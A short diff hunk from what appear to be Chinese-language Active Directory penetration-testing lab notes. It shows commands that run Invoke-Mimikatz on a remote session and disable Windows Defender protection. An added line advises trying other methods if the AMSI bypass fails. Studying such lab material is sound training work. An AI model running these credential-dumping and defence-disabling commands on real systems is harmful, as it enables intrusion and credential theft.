@@ -3220,7 +3220,7 @@ $sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
 Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
 ```
 
-指定目标靶机的session，在目标靶机关闭杀软
+指定目标靶机的session，在目标靶机关闭杀软。这里bypass AMSI如果执行不成功，可以直接进去试多几种方法
 ```
 Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
 ```
